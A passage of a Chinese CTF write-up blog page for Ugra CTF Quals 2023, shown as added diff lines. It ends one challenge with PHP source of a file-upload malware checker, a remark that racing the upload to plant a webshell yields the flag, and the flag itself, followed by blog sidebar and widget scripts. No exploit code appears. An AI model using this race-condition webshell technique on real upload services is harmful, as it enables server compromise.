+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;malware&quot;</span>])) &#123;
+<span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;malware&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);
+<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[-0-9a-zA-Z_\.]+$/&quot;</span>, <span class="hljs-variable">$file_name</span>)) &#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Dangerous filename&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+<span class="hljs-variable">$file_path</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-variable">$filename</span>;
+<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;malware&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$file_path</span>)) &#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to upload file&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+<span class="hljs-meta">?&gt;</span>
+Check results:
+
+&lt;pre&gt;<span class="hljs-meta">&lt;?=</span><span class="hljs-title function_ invoke__">check_malware</span>(<span class="hljs-variable">$file_path</span>)<span class="hljs-meta">?&gt;</span>&lt;/pre&gt;
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file_path</span>);
+&#125;
+&#125;
+&#125;
+<span class="hljs-meta">?&gt;</span>
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>一眼顶针，条件竞争，上传木马webshell即可得到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214449207.png?x-oss-process=hzy" alt="image-20230115214449207"></p>
+<p>ugra_ever_wondered_who_uses_virustotal_most_huh_vz00vcyc5wh6</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="故里 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/zhifubao.jpg" alt="故里 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>故里
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzy2003628.top/2023/01/16/Ugra%20CTF%20Quals%202023/" title="Ugra CTF Quals 2023">https://hzy2003628.top/2023/01/16/Ugra CTF Quals 2023/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" rel="tag"><i class="fa fa-tag"></i> 赛后复盘</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/10/%E9%93%81%E4%B8%89/" rel="prev" title="2023铁三第一赛区分区赛">
+      <i class="fa fa-chevron-left"></i> 2023铁三第一赛区分区赛
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+
+
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D1%82%D1%80%D0%B8%D1%81%D0%B5%D0%BA%D1%86%D0%B8%D1%8F"><span class="nav-number">2.1.</span> <span class="nav-text">Трисекция</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%D1%81%D1%82%D0%B0%D1%80%D1%8B%D0%B5-%D0%B4%D0%BE%D0%B1%D1%80%D1%8B%D0%B5-%D0%B2%D1%80%D0%B5%D0%BC%D0%B5%D0%BD%D0%B0"><span class="nav-number">2.2.</span> <span class="nav-text">Старые добрые времена</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%B2%D0%BE%D0%B4%D0%BE%D0%B2%D0%BE%D1%80%D0%BE%D1%82"><span class="nav-number">3.1.</span> <span class="nav-text">Водоворот</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#forensics"><span class="nav-number">4.</span> <span class="nav-text">FORENSICS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%B7%D0%B0%D1%85%D0%B2%D0%B0%D1%82-%D1%82%D1%80%D0%B0%D1%84%D0%B8%D0%BA%D0%B0"><span class="nav-number">4.1.</span> <span class="nav-text">Захват трафика</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stegano"><span class="nav-number">5.</span> <span class="nav-text">STEGANO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%BC%D1%83%D0%B7%D1%8B%D0%BA%D0%B0%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F-%D0%BF%D1%8F%D1%82%D0%B8%D0%BC%D0%B8%D0%BD%D1%83%D1%82%D0%BA%D0%B0"><span class="nav-number">5.1.</span> <span class="nav-text">Музыкальная пятиминутка</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">6.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%BF%D0%BE%D0%BB%D0%B5-%D0%B4%D0%BB%D1%8F-%D1%81%D0%B4%D0%B0%D1%87%D0%B8-%D1%84%D0%BB%D0%B0%D0%B3%D0%B0"><span class="nav-number">6.1.</span> <span class="nav-text">Поле для сдачи флага</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ppc"><span class="nav-number">7.</span> <span class="nav-text">PPC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%B3%D0%BB%D1%83%D0%B1%D0%B8%D0%BD%D0%B0"><span class="nav-number">7.1.</span> <span class="nav-text">Глубина</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctb"><span class="nav-number">8.</span> <span class="nav-text">CTB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%B4%D0%BE%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%D1%81%D1%82%D0%B2%D0%BE-%D0%B7%D0%B0%D0%BF%D1%83%D0%B3%D0%B8%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5%D0%BC"><span class="nav-number">8.1.</span> <span class="nav-text">Доказательство запугиванием</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%D0%B0%D0%BD%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D1%83%D1%81-%D0%B2%D0%BE%D0%B7%D0%B2%D1%80%D0%B0%D1%89%D0%B0%D0%B5%D1%82%D1%81%D1%8F"><span class="nav-number">8.2.</span> <span class="nav-text">Антивирус возвращается</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="故里"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">故里</p>
+  <div class="site-description" itemprop="description">没有所谓失败，除非你不再尝试</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">100</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:2596328958@qq.com" title="E-Mail → mailto:2596328958@qq.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	  
+
+	     <!-- canvas粒子时钟 -->
+        
+        <div id="">
+  <canvas id="canvas" style="width:60%;">
+</div>
+<script async>
+(function(){
+  var WINDOW_WIDTH = 820;
+  		var WINDOW_HEIGHT = 250;
+  		var RADIUS = 7; //球半径
+  		var NUMBER_GAP = 10; //数字之间的间隙
+  		var u=0.65; //碰撞能量损耗系数
+  		var context; //Canvas绘制上下文
+  		var balls = []; //存储彩色的小球
+  		const colors = ["#33B5E5","#0099CC","#AA66CC","#9933CC","#99CC00","#669900","#FFBB33","#FF8800","#FF4444","#CC0000"]; //彩色小球的颜色
+  		var currentNums = []; //屏幕显示的8个字符
+  		var digit =
+                  [
+                      [
+                          [0,0,1,1,1,0,0],
+                          [0,1,1,0,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,0,1,1,0],
+                          [0,0,1,1,1,0,0]
+                      ],//0
+                      [
+                          [0,0,0,1,1,0,0],
+                          [0,1,1,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [1,1,1,1,1,1,1]
+                      ],//1
+                      [
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,1,1,0,0,0,0],
+                          [1,1,0,0,0,0,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,1,1,1,1,1]
+                      ],//2
+                      [
+                          [1,1,1,1,1,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,1,1,1,0,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//3
+                      [
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,1,0],
+                          [0,0,1,1,1,1,0],
+                          [0,1,1,0,1,1,0],
+                          [1,1,0,0,1,1,0],
+                          [1,1,1,1,1,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,1,1]
+                      ],//4
+                      [
+                          [1,1,1,1,1,1,1],
+                          [1,1,0,0,0,0,0],
+                          [1,1,0,0,0,0,0],
+                          [1,1,1,1,1,1,0],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//5
+                      [
+                          [0,0,0,0,1,1,0],
+                          [0,0,1,1,0,0,0],
+                          [0,1,1,0,0,0,0],
+                          [1,1,0,0,0,0,0],
+                          [1,1,0,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//6
+                      [
+                          [1,1,1,1,1,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,0,1,1,0,0,0]
+                      ],//7
+                      [
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//8
+                      [
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,1,1,0,0,0,0]
+                      ],//9
+                      [
+                          [0,0,0,0],
+                          [0,0,0,0],
+                          [0,1,1,0],
+                          [0,1,1,0],
+                          [0,0,0,0],
+                          [0,0,0,0],
+                          [0,1,1,0],
+                          [0,1,1,0],
+                          [0,0,0,0],
+                          [0,0,0,0]
+                      ]//:
+                  ];
+
+  		function drawDatetime(cxt){
+  			var nums = [];
+
+  			context.fillStyle="#005eac"
+  			var date = new Date();
+  			var offsetX = 70, offsetY = 30;
+  			var hours = date.getHours();
+  			var num1 = Math.floor(hours/10);
+  			var num2 = hours%10;
+  			nums.push({num: num1});
+  			nums.push({num: num2});
+  			nums.push({num: 10}); //冒号
+  			var minutes = date.getMinutes();
+  			var num1 = Math.floor(minutes/10);
+  			var num2 = minutes%10;
+  			nums.push({num: num1});
+  			nums.push({num: num2});
+  			nums.push({num: 10}); //冒号
+  			var seconds = date.getSeconds();
+  			var num1 = Math.floor(seconds/10);
+  			var num2 = seconds%10;
+  			nums.push({num: num1});
+  			nums.push({num: num2});
+
+  			for(var x = 0;x<nums.length;x++){
+  				nums[x].offsetX = offsetX;
+  				offsetX = drawSingleNumber(offsetX,offsetY, nums[x].num,cxt);
+  				//两个数字连一块，应该间隔一些距离
+  				if(x<nums.length-1){
+  					if((nums[x].num!=10) &&(nums[x+1].num!=10)){
+  						offsetX+=NUMBER_GAP;
+  					}
+  				}
+  			}
+
+  			//说明这是初始化
+  			if(currentNums.length ==0){
+  				currentNums = nums;
+  			}else{
+  				//进行比较
+  				for(var index = 0;index<currentNums.length;index++){
+  					if(currentNums[index].num!=nums[index].num){
+  						//不一样时，添加彩色小球
+  						addBalls(nums[index]);
+  						currentNums[index].num=nums[index].num;
+  					}
+  				}
+  			}
+  			renderBalls(cxt);
+  			updateBalls();
+
+  			return date;
+  		}
+
+  		function addBalls (item) {
+  			var num = item.num;
+  			var numMatrix = digit[num];
+  			for(var y = 0;y<numMatrix.length;y++){
+  				for(var x = 0;x<numMatrix[y].length;x++){
+  					if(numMatrix[y][x]==1){
+  						var ball={
+  							offsetX:item.offsetX+RADIUS+RADIUS*2*x,
+  							offsetY:30+RADIUS+RADIUS*2*y,
+  							color:colors[Math.floor(Math.random()*colors.length)],
+  							g:1.5+Math.random(),
+  							vx:Math.pow(-1, Math.ceil(Math.random()*10))*4+Math.random(),
+  							vy:-5
+  						}
+  						balls.push(ball);
+  					}
+  				}
+  			}
+  		}
+
+  		function renderBalls(cxt){
+  			for(var index = 0;index<balls.length;index++){
+  				cxt.beginPath();
+  				cxt.fillStyle=balls[index].color;
+  				cxt.arc(balls[index].offsetX, balls[index].offsetY, RADIUS, 0, 2*Math.PI);
+  				cxt.fill();
+  			}
+  		}
+
+  		function updateBalls () {
+  			var i =0;
+  			for(var index = 0;index<balls.length;index++){
+  				var ball = balls[index];
+  				ball.offsetX += ball.vx;
+  				ball.offsetY += ball.vy;
+  				ball.vy+=ball.g;
+  				if(ball.offsetY > (WINDOW_HEIGHT-RADIUS)){
+  					ball.offsetY= WINDOW_HEIGHT-RADIUS;
+  					ball.vy=-ball.vy*u;
+  				}
+  				if(ball.offsetX>RADIUS&&ball.offsetX<(WINDOW_WIDTH-RADIUS)){
+
+  					balls[i]=balls[index];
+  					i++;
+  				}
+  			}
+  			//去除出边界的球
+  			for(;i<balls.length;i++){
+  				balls.pop();
+  			}
+  		}
+  		function drawSingleNumber(offsetX, offsetY, num, cxt){
+  			var numMatrix = digit[num];
+  			for(var y = 0;y<numMatrix.length;y++){
+  				for(var x = 0;x<numMatrix[y].length;x++){
+  					if(numMatrix[y][x]==1){
+  						cxt.beginPath();
+  						cxt.arc(offsetX+RADIUS+RADIUS*2*x,offsetY+RADIUS+RADIUS*2*y,RADIUS,0,2*Math.PI);
+  						cxt.fill();
+  					}
+  				}
+  			}
+  			cxt.beginPath();
+  			offsetX += numMatrix[0].length*RADIUS*2;
+  			return offsetX;
+  		}
+
+  		var canvas = document.getElementById("canvas");
+  		canvas.width=WINDOW_WIDTH;
+  		canvas.height=WINDOW_HEIGHT;
+  		context = canvas.getContext("2d");
+
+  		//记录当前绘制的时刻
+  		var currentDate = new Date();
+
+  		setInterval(function(){
+  			//清空整个Canvas，重新绘制内容
+  			context.clearRect(0, 0, context.canvas.width, context.canvas.height);
+  			drawDatetime(context);
+  		}, 50)
+})();
+</script>
+
+
+      
+
+
+<!--添加标签云-->
+        
+          <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+          <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+          <div class="widget-wrap">
+            <div>标签云</div>
+            <div id="myCanvasContainer" class="widget tagcloud">
+              <canvas width="250" height="250" id="resCanvas" style="width=100%">
+              <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">66</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E5%88%B7%E9%A2%98%E5%B9%B3%E5%8F%B0%E6%8E%A8%E8%8D%90/" rel="tag">CTF刷题平台推荐</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/" rel="tag">HTTP头部信息分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E7%89%B9%E6%80%A7/" rel="tag">PHP特性</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/" rel="tag">RE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">19</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%B7%A5%E5%85%B7%E5%8C%85/" rel="tag">Web工具包</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugctf/" rel="tag">bugctf</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctfshow/" rel="tag">ctfshow</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/next%E4%B8%BB%E9%A2%98%E5%A4%B1%E6%95%88/" rel="tag">next主题失效</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/" rel="tag">xxe</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8D%E8%92%9C%E5%AD%90%E4%B8%8D%E6%98%BE%E7%A4%BA/" rel="tag">不蒜子不显示</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/" rel="tag">博客主题优化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%AD%BB%E5%BE%AA%E7%8E%AF%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/" rel="tag">博客死循环框架问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" rel="tag">博客部分问题解决方法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%80%E5%9F%9F%E7%BD%91%E6%94%BB%E5%87%BB/" rel="tag">局域网攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" rel="tag">常用指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%95%99%E8%A8%80%E6%9D%BF/" rel="tag">留言板</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" rel="tag">评论系统</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" rel="tag">赛后复盘</a><span class="tag-list-count">44</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" rel="tag">黑盒测试</a><span class="tag-list-count">1</span></li></ul>
+              </canvas>
+            </div>
+         </div>
+        
+	  
+
+
+
+ 
+	  
+	  
+
+
+   </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022003011号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000197%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000197号 </a>
+  </div>
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+   </span>
+  <span class="author" itemprop="copyrightHolder">故里</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">904k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">13:42</span>
+</div>
+
+
+
+
+
+
+
+<section class="footer-time">
+    <span class="footer__copyright">
+    <div>
+    <span id="span_dt_dt"> </span>
+    <script language="javascript">
+      function show_date_time(){
+        window.setTimeout("show_date_time()", 1000);
+        BirthDay=new Date("12/25/2021 10:56:12");//这个日期是可以修改的
+        today=new Date();
+        timeold=(today.getTime()-BirthDay.getTime());//其实仅仅改了这里
+        sectimeold=timeold/1000
+        secondsold=Math.floor(sectimeold);
+        msPerDay=24*60*60*1000
+        e_daysold=timeold/msPerDay
+        daysold=Math.floor(e_daysold);
+        e_hrsold=(e_daysold-daysold)*24;
+        hrsold=Math.floor(e_hrsold);
+        e_minsold=(e_hrsold-hrsold)*60;
+        minsold=Math.floor((e_hrsold-hrsold)*60);
+        seconds=Math.floor((e_minsold-minsold)*60);
+        span_dt_dt.innerHTML="我已在此等候你 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+      }
+      show_date_time();
+    </script>
+    </div>
+	
+	
+
+
+
+
+<!--这一段是不蒜子的访问量统计代码-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+我的第<span id="busuanzi_value_site_uv"></span>位朋友
+历经<span id="busuanzi_value_site_pv"></span>次回眸才与你相遇</span>
+
+	 
+	 
+	 
+
